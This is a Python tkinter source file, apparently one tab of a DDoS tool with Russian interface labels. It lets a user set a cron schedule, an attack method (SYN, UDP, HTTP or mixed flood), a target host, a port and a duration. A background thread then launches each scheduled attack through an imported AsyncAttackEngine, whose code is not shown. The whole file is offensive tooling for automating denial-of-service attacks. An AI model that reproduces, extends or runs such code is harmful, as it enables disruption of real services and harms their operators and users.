import tkinter as tk
from tkinter import ttk, messagebox
from croniter import croniter
from datetime import datetime
import threading, asyncio, json
from engine.attack import AsyncAttackEngine

class AutoTab(tk.Frame):
    def __init__(self, parent):
        super().__init__(parent)
        self.tasks = []
        self.engine = AsyncAttackEngine()
        self.build_ui()
        self.scheduler_thread = threading.Thread(target=self.loop, daemon=True)
        self.scheduler_thread.start()
    def build_ui(self):
        ttk.Label(self, text="Cron:").pack(anchor=tk.W)
        self.cron_entry = ttk.Entry(self)
        self.cron_entry.pack()
        ttk.Label(self, text="Метод:").pack()
        self.method_var = tk.StringVar(value="syn")
        ttk.Combobox(self, textvariable=self.method_var, values=["syn","udp","http","mixed"]).pack()
        ttk.Label(self, text="Цель:").pack()
        self.target_entry = ttk.Entry(self)
        self.target_entry.pack()
        ttk.Label(self, text="Порт:").pack()
        self.port_entry = ttk.Entry(self, width=10)
        self.port_entry.insert(0,"80")
        self.port_entry.pack()
        ttk.Label(self, text="Длительность (с):").pack()
        self.duration_entry = ttk.Entry(self, width=10)
        self.duration_entry.insert(0,"60")
        self.duration_entry.pack()
        ttk.Button(self, text="Добавить", command=self.add).pack(pady=5)
        self.task_list = tk.Listbox(self, width=80)
        self.task_list.pack(fill=tk.BOTH, expand=True)
    def add(self):
        cron = self.cron_entry.get()
        method = self.method_var.get()
        target = self.target_entry.get()
        port = int(self.port_entry.get())
        duration = int(self.duration_entry.get())
        self.tasks.append({'cron':cron,'method':method,'target':target,'port':port,'duration':duration})
        self.task_list.insert(tk.END, f"{cron} {method} {target}:{port}")
    def loop(self):
        while True:
            now = datetime.now()
            for t in self.tasks:
                if croniter.match(t['cron'], now):
                    asyncio.run(self.engine.run_attack(t['method'],t['target'],t['port'],t['duration']))
            threading.Event().wait(30)
